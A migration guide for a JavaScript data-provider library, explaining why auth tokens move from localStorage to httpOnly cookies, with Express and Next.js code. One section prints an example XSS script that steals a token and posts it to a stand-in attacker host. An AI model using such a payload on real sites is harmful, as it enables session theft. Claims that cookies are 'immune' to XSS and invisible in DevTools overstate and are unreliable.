# Migration Guide: localStorage → httpOnly Cookies

## 🔐 Why This Change?

**Starting in v2.1, all presets default to `storage: 'cookie'` instead of `localStorage`.**

### Security Vulnerability: XSS Attacks

```javascript
// ❌ VULNERABLE: localStorage is accessible via JavaScript
localStorage.getItem("token"); // Can be stolen by malicious scripts

// ✅ SECURE: httpOnly cookies are inaccessible to JavaScript
// Cookies are automatically sent with requests, immune to XSS
```

**Real-world XSS Attack Example:**

```html
<!-- Attacker injects malicious script via comment, blog post, etc. -->
<script>
  // Steal token from localStorage
  const token = localStorage.getItem("token");
  fetch("https://attacker.com/steal", {
    method: "POST",
    body: JSON.stringify({ token }),
  });
</script>
```

**With httpOnly cookies, this attack fails** because JavaScript cannot read the cookie.

---

## 📋 Migration Checklist

### 1. Update Minder Configuration

**Before (v2.0 - Vulnerable):**

```typescript
import { createMinderConfig } from "minder-data-provider";

const config = createMinderConfig({
  auth: {
    storage: "localStorage", // ⚠️ Vulnerable to XSS
  },
});
```

**After (v2.1 - Secure):**

```typescript
import { createMinderConfig } from "minder-data-provider";

const config = createMinderConfig({
  auth: {
    storage: "cookie", // ✅ XSS resistant
  },
});
```

**Or use presets (recommended):**

```typescript
import { createFromPreset } from "minder-data-provider/config";

// All presets now default to 'cookie'
const config = createFromPreset("standard");
```

---

### 2. Update Backend to Send httpOnly Cookies

**Express.js Example:**

```typescript
// ❌ OLD: Sending token in JSON response (client stores in localStorage)
app.post("/api/auth/login", async (req, res) => {
  const token = await generateToken(req.body);
  res.json({ token }); // Client will store in localStorage
});

// ✅ NEW: Sending token as httpOnly cookie
app.post("/api/auth/login", async (req, res) => {
  const token = await generateToken(req.body);

  res.cookie("token", token, {
    httpOnly: true, // Cannot be accessed by JavaScript
    secure: true, // Only sent over HTTPS
    sameSite: "strict", // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  });

  res.json({ success: true });
});
```

**Next.js API Route Example:**

```typescript
// app/api/auth/login/route.ts
import { cookies } from "next/headers";

export async function POST(request: Request) {
  const { email, password } = await request.json();
  const token = await generateToken(email, password);

  cookies().set("token", token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",
    maxAge: 7 * 24 * 60 * 60, // 7 days
  });

  return Response.json({ success: true });
}
```

---

### 3. Update Logout Endpoint

**Express.js:**

```typescript
app.post("/api/auth/logout", (req, res) => {
  res.clearCookie("token");
  res.json({ success: true });
});
```

**Next.js:**

```typescript
// app/api/auth/logout/route.ts
import { cookies } from "next/headers";

export async function POST() {
  cookies().delete("token");
  return Response.json({ success: true });
}
```

---

### 4. Update Token Refresh Endpoint

**Before (localStorage):**

```typescript
// Client sends token manually
fetch("/api/auth/refresh", {
  headers: {
    Authorization: `Bearer ${localStorage.getItem("token")}`,
  },
});
```

**After (cookies - automatic):**

```typescript
// Cookie sent automatically by browser
fetch("/api/auth/refresh", {
  credentials: "include", // Ensure cookies are sent
});
```

**Backend:**

```typescript
app.post("/api/auth/refresh", async (req, res) => {
  const oldToken = req.cookies.token; // Read from cookie
  const newToken = await refreshToken(oldToken);

  res.cookie("token", newToken, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });

  res.json({ success: true });
});
```

---

### 5. Update CORS Configuration

**Cookies require `credentials: 'include'` in requests:**

```typescript
// Minder automatically handles this when storage: 'cookie'
const config = createMinderConfig({
  auth: { storage: "cookie" },
  cors: {
    credentials: true, // ✅ Automatically set when using cookies
  },
});
```

**Backend must allow credentials:**

```typescript
// Express.js
app.use(
  cors({
    origin: "http://localhost:3000",
    credentials: true, // ✅ Allow cookies
  })
);

// Next.js (next.config.js)
module.exports = {
  async headers() {
    return [
      {
        source: "/api/:path*",
        headers: [
          { key: "Access-Control-Allow-Credentials", value: "true" },
          {
            key: "Access-Control-Allow-Origin",
            value: "http://localhost:3000",
          },
        ],
      },
    ];
  },
};
```

---

## 🚨 Breaking Changes

### 1. Token No Longer in Response Body

**Before:**

```typescript
const { data } = await minder.auth.login({ email, password });
console.log(data.token); // ✅ Token returned
```

**After:**

```typescript
const { data } = await minder.auth.login({ email, password });
console.log(data.token); // ❌ undefined (token in cookie now)
console.log(data.success); // ✅ true
```

### 2. Manual Token Access Removed

**Before:**

```typescript
const token = localStorage.getItem("token");
```

**After:**

```typescript
// ❌ Cannot access httpOnly cookies from JavaScript
// ✅ Token automatically sent with requests
```

### 3. CORS Must Allow Credentials

**Before:**

```typescript
// Simple CORS worked
fetch("/api/data");
```

**After:**

```typescript
// Must include credentials
fetch("/api/data", {
  credentials: "include", // Minder handles this automatically
});
```

---

## 🔄 Backward Compatibility

If you **must** continue using localStorage (not recommended):

```typescript
import { createMinderConfig } from "minder-data-provider";

const config = createMinderConfig({
  auth: {
    storage: "localStorage", // ⚠️ Still supported, but not secure
  },
});
```

**However, we strongly recommend migrating to cookies for security.**

---

## 📊 Migration Timeline

| Version | Default Storage | localStorage Support        |
| ------- | --------------- | --------------------------- |
| v2.0.x  | `localStorage`  | ✅ Default                  |
| v2.1.x  | `cookie`        | ⚠️ Deprecated (still works) |
| v3.0.x  | `cookie`        | ❌ Removed                  |

**Action Required:** Migrate to `storage: 'cookie'` before v3.0 (Q3 2026).

---

## 🛡️ Security Benefits Summary

| Feature                         | localStorage           | httpOnly Cookie           |
| ------------------------------- | ---------------------- | ------------------------- |
| **XSS Protection**              | ❌ Vulnerable          | ✅ Immune                 |
| **CSRF Protection**             | ✅ (if using SameSite) | ✅ (with SameSite)        |
| **Automatic Sending**           | ❌ Manual              | ✅ Automatic              |
| **Expires After Browser Close** | ❌ Persists            | ⚠️ Optional               |
| **Size Limit**                  | ~5-10MB                | ~4KB (sufficient for JWT) |

---

## 🆘 Troubleshooting

### Issue: Cookies not being sent

**Solution:**

```typescript
// 1. Check CORS credentials
const config = createMinderConfig({
  cors: { credentials: true },
});

// 2. Verify backend allows credentials
app.use(cors({ credentials: true, origin: "http://localhost:3000" }));

// 3. Ensure HTTPS in production (required for secure cookies)
```

### Issue: Token not refreshing

**Solution:**

```typescript
// Ensure refresh endpoint returns new cookie
app.post("/api/auth/refresh", async (req, res) => {
  const newToken = await refreshToken(req.cookies.token);

  res.cookie("token", newToken, { httpOnly: true }); // ✅ Set new cookie
  res.json({ success: true });
});
```

### Issue: Logout not working

**Solution:**

```typescript
// Clear cookie on logout
app.post("/api/auth/logout", (req, res) => {
  res.clearCookie("token"); // ✅ Remove cookie
  res.json({ success: true });
});
```

---

## 📚 Additional Resources

- [OWASP: XSS Prevention](https://owasp.org/www-community/attacks/xss/)
- [MDN: HttpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)
- [Auth0: Token Storage Best Practices](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)

---

## ✅ Migration Complete?

Run this checklist:

- [ ] Updated Minder config to `storage: 'cookie'`
- [ ] Backend sends tokens as httpOnly cookies
- [ ] Logout endpoint clears cookies
- [ ] Refresh endpoint returns new cookie
- [ ] CORS allows credentials
- [ ] Tested login/logout/refresh flows
- [ ] Verified XSS protection (cookies not accessible from DevTools → Application → Storage)

**Need help?** Open an issue at [github.com/minder-data-provider/issues](https://github.com)
